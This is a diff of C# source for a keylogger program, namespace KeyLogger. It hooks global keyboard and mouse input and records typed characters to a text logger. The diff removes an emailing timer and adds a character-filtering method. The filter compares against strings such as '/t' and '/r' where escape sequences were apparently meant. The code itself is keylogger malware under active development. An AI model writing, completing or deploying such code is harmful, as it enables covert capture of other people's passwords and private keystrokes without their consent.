@@ -17,7 +17,6 @@ namespace KeyLogger
         private UserActivityHook _hooker;
 
         private int _tik;
-        private Params _emailparams;
         private bool _isLoggerOn;
 
         private TextLogger _logger;
@@ -44,7 +43,6 @@ namespace KeyLogger
             if (_hooker.IsActive)
             {
                 _hooker.Stop();
-                timer_emailer.Enabled = false;
                 timer_logsaver.Enabled = false;
             }
         }
@@ -55,38 +53,43 @@ namespace KeyLogger
             _hooker.KeyDown += HookerKeyDown;
             _hooker.KeyPress += HookerKeyPress;
             _hooker.KeyUp += HookerKeyUp;
+            _hooker.OnMouseActivity += HookerMouseActivity;
             _hooker.Stop();
 
             _logger = new TextLogger();
             _appNames = new Stack();
         }
 
-        public void HookerKeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyData.ToString() == "Return")
-                Logger("[Enter]");
-            if (e.KeyData.ToString() == "Escape")
-                Logger("[Escape]");
-        }
+        public void HookerMouseActivity(object sender, MouseEventArgs e){}
+
+        public void HookerKeyDown(object sender, KeyEventArgs e){}
 
         public void HookerKeyPress(object sender, KeyPressEventArgs e)
         {
             _allowtoTik = true;
-            if ((byte) e.KeyChar == 9)
-                Logger("[TAB]");
-            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
-                Logger(e.KeyChar.ToString());
-            else if (e.KeyChar == 32)
-                Logger(" ");
-            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
-                Logger("[Char\\" + ((byte) e.KeyChar) + "]");
-
+            Logger(FilterKeyChar(e.KeyChar));
             _tik = 0;
         }
 
-        public void HookerKeyUp(object sender, KeyEventArgs e)
-        {
+        public void HookerKeyUp(object sender, KeyEventArgs e){}
 
+        private string FilterKeyChar(char key)
+        {
+            //Grab all digits/letters/punctuations/symbols/punctuations
+            if(Char.IsLetterOrDigit(key) || Char.IsPunctuation(key) || Char.IsSymbol(key) || Char.IsPunctuation(key))
+            {
+                return key.ToString();
+            }
+
+            var charString = key.ToString();
+            switch (charString)
+            {
+                case " ": return " ";
+                case "/t": return " ";
+                case "/r": return "/n";
+            }
+
+            return string.Empty;
         }
 
         private void Logger(string txt)
